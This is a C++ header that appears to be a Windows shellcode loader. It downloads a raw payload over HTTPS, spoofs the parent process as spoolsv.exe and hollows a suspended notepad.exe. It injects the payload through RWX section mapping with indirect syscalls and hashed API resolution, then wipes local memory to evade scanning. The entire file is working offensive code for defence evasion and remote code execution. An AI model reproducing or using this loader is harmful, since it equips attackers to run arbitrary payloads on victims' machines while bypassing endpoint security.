#pragma once
#include <Windows.h>
#include <winternl.h>
#include <iostream> 
#include <tlhelp32.h>
#include <tchar.h>
#include <vector>
#include <winhttp.h>
#include <psapi.h>
#include <cassert>
#include <ntstatus.h>
#pragma comment(lib, "winhttp.lib")





// Structures definitions
typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(_Out_ PHANDLE hThread, _In_  ACCESS_MASK DesiredAccess, _In_  LPVOID ObjectAttributes, _In_  HANDLE ProcessHandle, _In_  LPTHREAD_START_ROUTINE lpStartAddress, _In_  LPVOID lpParameter, _In_  BOOL CreateSuspended, _In_  DWORD StackZeroBits, _In_  DWORD SizeOfStackCommit, _In_  DWORD SizeOfStackReserve, _Out_ LPVOID lpBytesBuffer);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(_In_ HANDLE ProcessHandle, _In_opt_ PVOID BaseAddress, _In_ VOID* Buffer, _In_ SIZE_T BufferSize, _Out_opt_ PSIZE_T NumberOfBytesWritten);
typedef public NTSTATUS(NTAPI* _NtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
typedef public NTSTATUS(NTAPI* _NtQueryInformationThread) (IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength);
typedef public NTSTATUS(NTAPI* _NtCreateSection)(OUT PHANDLE SectionHandle, IN ULONG DesiredAccess, IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes, IN OPTIONAL PLARGE_INTEGER MaximumSize, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN OPTIONAL HANDLE FileHandle);
typedef public NTSTATUS(NTAPI* _NtMapViewOfSection)(IN HANDLE SectionHandle, IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG_PTR ZeroBits, IN SIZE_T CommitSize, IN OUT OPTIONAL PLARGE_INTEGER SectionOffset, IN OUT PSIZE_T ViewSize, IN DWORD InheritDisposition, IN ULONG AllocationType, IN ULONG Win32Protect);
typedef public NTSTATUS(NTAPI* _NtUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress OPTIONAL);
typedef enum _SECTION_INHERIT : DWORD { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT, * PSECTION_INHERIT;








// Compile Time Functions definitions
// Credits to MALDEVACADEMY
// Generate a random key at compile time which is used as the initial hash
constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

// The compile time random seed
constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

// Compile time Djb2 hashing function (ASCII)
#define SEED 5
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}

// runtime hashing macros
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
constexpr auto ntcreate_Rotr32A = HashStringDjb2A("NtCreateSection");
constexpr auto ntmap_Rotr32A = HashStringDjb2A("NtMapViewOfSection");
constexpr auto ntunmap_Rotr32A = HashStringDjb2A("NtUnmapViewOfSection");
constexpr auto ntalloc_Rotr32A = HashStringDjb2A("NtAllocateVirtualMemory");
constexpr auto ntprotect_Rotr32A = HashStringDjb2A("NtProtectVirtualMemory");
constexpr auto ntcreatethread_Rotr32A = HashStringDjb2A("NtCreateThreadEx");
constexpr auto ntwrite_Rotr32A = HashStringDjb2A("NtWriteVirtualMemory");
constexpr auto ntquery_Rotr32A = HashStringDjb2A("NtQueryInformationThread");
constexpr auto ntqueue_Rotr32A = HashStringDjb2A("NtQueueApcThread");

// static variables
char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
char sntdll[] = { '.','t','e','x','t',0 };
char _ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };







// Static functions definitions

/**
* Credits to MALDEVACADEMY
* Compares two strings (case insensitive)
*/
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {
    WCHAR   lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int		len1 = lstrlenW(Str1),
        len2 = lstrlenW(Str2);

    int		i = 0,
        j = 0;
    // Checking length. We dont want to overflow the buffers
    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;
    // Converting Str1 to lower case string (lStr1)
    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(Str1[i]);
    }
    lStr1[i++] = L'\0'; // null terminating
    // Converting Str2 to lower case string (lStr2)
    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(Str2[j]);
    }
    lStr2[j++] = L'\0'; // null terminating
    // Comparing the lower-case strings
    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;
    return FALSE;
}





/**
* Credits to MALDEVACADEMY
* Retrieves the base address of a module from the PEB
* and enumerates the linked list of modules to find the correct one.
*/
HMODULE CustomGetModuleHandle(IN char szModuleName[]) {
    // convert char to LPCWSTR
    int wideStrLen = MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, nullptr, 0);
    wchar_t* wideStr = new wchar_t[wideStrLen];
    MultiByteToWideChar(CP_UTF8, 0, szModuleName, -1, wideStr, wideStrLen);
    LPCWSTR lpWideStr = wideStr;
    // Getting PEB
#ifdef _WIN64 // if compiling as x64
    PPEB			pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
    PPEB			pPeb = (PEB*)(__readfsdword(0x30));
#endif// Getting Ldr
    PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    // Getting the first element in the linked list which contains information about the first module
    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
    while (pDte) {
        // If not null
        if (pDte->FullDllName.Length != NULL) {
            // Check if both equal
            if (IsStringEqual(pDte->FullDllName.Buffer, lpWideStr)) {
                //wprintf(L"[+] Module found from PEB : \"%s\" \n", pDte->FullDllName.Buffer);
                return(HMODULE)pDte->Reserved2[0];
            }
        }
        else {
            break;
        }
        // Next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    wprintf(L"[+] Module not found in PEB");
    return NULL;
}




/** 
* Credits to MALDEVACADEMY
* Retrieves the address of an exported function from a specified module handle. 
* The function returns NULL if the function name is not found in the specified module handle.
*/
FARPROC CustomGetProcAddress(IN HMODULE hModule, IN DWORD lpApiName) {
    if (hModule == NULL)
		return NULL;
    // We do this to avoid casting at each time we use 'hModule'
    PBYTE pBase = (PBYTE)hModule;
    // Getting the dos header and doing a signature check
    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;
    // Getting the nt headers and doing a signature check
    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;
    // Getting the optional header
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
    // Getting the image export table
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    // Getting the function's names array pointer
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    // Getting the function's addresses array pointer
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    // Getting the function's ordinal array pointer
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
    // Looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        // Getting the name of the function
        char* pFunctionName = (char*)(pBase + FunctionNameArray[i]);

        // Getting the address of the function through its ordinal
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
        
        // Searching for the function specified
        if (lpApiName == RTIME_HASHA(pFunctionName)) {
            //printf("\t[+] Function %s found at address 0x%p with ordinal %d\n", pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return (FARPROC)pFunctionAddress;
        }
    }
    printf("\n\t[!] Function with hash %lu not found\n", lpApiName);
    return NULL;
}







/**
*   Download a raw payload from an external website into a buffer
*/
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
    printf("[+] Downloading remote payload\n");
    HINTERNET hSession = WinHttpOpen(NULL,WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,WINHTTP_FLAG_SECURE_DEFAULTS);
    HINTERNET hConnect = WinHttpConnect(hSession,baseAddress,INTERNET_DEFAULT_HTTPS_PORT,0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,L"GET",filename,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
    WinHttpReceiveResponse(hRequest,NULL);
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;
    do {
        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buffer;
}





/**
*   Check all running processes to find the PID of the spoolsv process
*/
DWORD GetPID() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (_tcsicmp(processEntry.szExeFile, _T("spoolsv.exe")) == 0) {
                    printf("[+] Retrieving spoolsv PID : %lu\n", processEntry.th32ProcessID);
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}






/*
* Credits to am0nsec
* https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
*/
PVOID CustomMemMove(PVOID dest, const PVOID src, SIZE_T len) {
    char* d = (char* )dest;
    const char* s = (char*)src;
    if (d < s)
        while (len--)
            *d++ = *s++;
    else {
        char* lasts = (char*)s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}











// Global variables definitions
EXTERN_C DWORD syscallID = 0;
EXTERN_C UINT_PTR syscallAddr = 0;

// ASM functions definitions
extern "C" VOID indirect_sys(...);

/**
*   Execute our raw payload by creating a suspended process (Process Hollowing)
*   with a custom thread attribute list to spoof its parent PID (PPID spoofing)
*   and creating a new section into our child process memory to copy our shellcode
*   and finally restore closing the delete-pending state to execute our payload
*/
void execution(std::vector<BYTE> sh, DWORD exPID) {
    printf("[+] Opening a handle on spoolsv process\n");
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, exPID);
    LPVOID ptr = &sh[0];
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
    printf("[+] Creating suspended process with PPID spoofing\n");
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    HMODULE hNtdll = CustomGetModuleHandle(_ntdll);

    
    FARPROC pNtCreateSection = CustomGetProcAddress(hNtdll, ntcreate_Rotr32A);
    UINT_PTR pNtCreateSectionSyscallID = (UINT_PTR)pNtCreateSection + 4;
    syscallID = ((unsigned char*)(pNtCreateSectionSyscallID))[0];
    printf("[+] Syscall value of NtCreateSection : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtCreateSection + 0x12;
    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { sh.size() };
    printf("[+] Creating new section through indirect syscall\n");
    indirect_sys(&hSection, SECTION_ALL_ACCESS, NULL, &szSection, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);


    FARPROC pNtMapViewOfSection = CustomGetProcAddress(hNtdll, ntmap_Rotr32A);
    UINT_PTR pNtMapViewOfSectionSyscallID = (UINT_PTR)pNtMapViewOfSection + 4;
    syscallID = ((unsigned char*)(pNtMapViewOfSectionSyscallID))[0];
    printf("[+] Syscall value of NtMapViewOfSection : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtMapViewOfSection + 0x12;
    // map section into memory of our local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;
    indirect_sys(hSection, GetCurrentProcess(), &hLocalAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
    printf("[+] Mapping new section through indirect syscall\n");      

    // copy shellcode into our local memory
    CustomMemMove(hLocalAddress, ptr, sh.size());
    printf("[+] Copying shellcode into our new local section\n");

    // map section into memory of suspended child process
    PVOID hRemoteAddress = NULL;
    printf("[+] Adding new section with shellcode\n");

    indirect_sys(hSection, victimProcess, &hRemoteAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
    printf("[+] Copying local section to victim process through indirect syscall\n");


    // wiping our current process memory to avoid memory scanning
    printf("[+] Cleaning local memory\n");
    memset(&sh, 0, sizeof(sh));
    memset(&hLocalAddress, 0, sizeof(hLocalAddress));


    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    printf("[+] Creating new thread\n");

    GetThreadContext(threadHandle, pContext);
    // update rcx context to execute our payload
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(threadHandle, pContext);
    printf("[+] Resuming execution\n");
    ResumeThread(threadHandle);

    FARPROC pNtUnmapViewOfSection = CustomGetProcAddress(hNtdll, ntunmap_Rotr32A);
    UINT_PTR pNtUnmapViewOfSectionSyscallID = (UINT_PTR)pNtUnmapViewOfSection + 4;
    syscallID = ((unsigned char*)(pNtUnmapViewOfSectionSyscallID))[0];
    printf("[+] Syscall value of NtUnmapViewOfSection : 0x%04x\n", syscallID);
    syscallAddr = (UINT_PTR)pNtUnmapViewOfSection + 0x12;
    indirect_sys(victimProcess, hLocalAddress);
    printf("[+] Unmapping local section through indirect syscall\n");
}



